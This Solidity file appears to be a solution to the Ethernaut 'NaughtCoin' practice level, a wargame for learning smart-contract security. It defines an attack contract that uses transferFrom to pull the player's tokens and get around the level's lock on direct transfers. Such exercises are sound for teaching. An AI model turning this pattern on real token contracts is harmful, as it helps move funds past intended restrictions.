// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

interface INaughtCoin is IERC20 {
    function transfer(address _to, uint256 _value) override external returns(bool);
}

contract NaughtCoinAttack {
    INaughtCoin public ethernautInstance;
    address player;

    constructor(address instanceAddress) {
        ethernautInstance = INaughtCoin(instanceAddress);
        player = msg.sender;
    }

    function attack(uint256 amount) public {
        ethernautInstance.transferFrom(player, address(this), amount);
    }
}